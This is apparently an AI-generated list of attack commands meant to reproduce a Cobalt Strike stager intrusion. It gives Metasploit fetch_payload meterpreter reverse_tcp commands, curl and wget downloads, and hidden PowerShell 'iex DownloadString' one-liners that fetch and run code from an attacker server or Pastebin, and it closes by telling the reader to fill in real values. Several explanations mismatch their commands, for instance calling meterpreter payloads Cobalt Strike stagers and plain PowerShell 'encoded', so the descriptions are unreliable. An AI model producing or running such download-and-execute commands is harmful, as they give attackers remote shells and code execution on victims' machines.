Based on the provided documentation and attack description, I will generate realistic command lines using only the tool Metasploit to reproduce the specified attack behavior.

**Command:** `fetch_payload linux http/x64/meterpreter/reverse_tcp`

This command simulates the initial download of a Cobalt Strike httpsstager payload using the HTTP protocol on a Linux platform.

**Command:** `fetch_payload windows http/x64/meterpreter/reverse_tcp`

This command simulates the download of a second Cobalt Strike httpsstager payload using the HTTP protocol on a Windows platform.

**Command:** `fetch_payload linux https/x64/meterpreter/reverse_tcp`

This command simulates the download of a third Cobalt Strike httpsstager payload using the HTTPS protocol on a Linux platform.

**Command:** `curl -o <file_path> 'https://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp'`

This command simulates the use of cURL to download and execute the meterpreter payload from an HTTP server.

**Command:** `wget -O <file_path> 'http://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp'`

This command simulates the use of WGET to download and execute the meterpreter payload from an HTTP server.

**Command:** `powershell -nop -w hidden -c "iex ((New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/<paste_id>'))"`

This command simulates the execution of encoded PowerShell commands to download and execute content from Pastebin.

**Command:** `powershell -nop -w hidden -c "iex ((New-Object System.Net.WebClient).DownloadString('http://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp'))"`

This command simulates the execution of encoded PowerShell commands to download and execute the meterpreter payload from an HTTP server.

**Command:** `powershell -nop -w hidden -c "iex ((New-Object System.Net.WebClient).DownloadString('https://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp'))"`

This command simulates the execution of encoded PowerShell commands to download and execute the meterpreter payload from an HTTPS server.

**Command:** `powershell -nop -w hidden -c "iex ((New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/<paste_id>'))"`

This command simulates the preparation of distribution and utility scripts for later transfer and use.

Note: The placeholders `<file_path>`, `<SRVHOST>`, `<SRVPORT>`, and `<paste_id>` should be replaced with actual values using the correct syntax from the documentation.
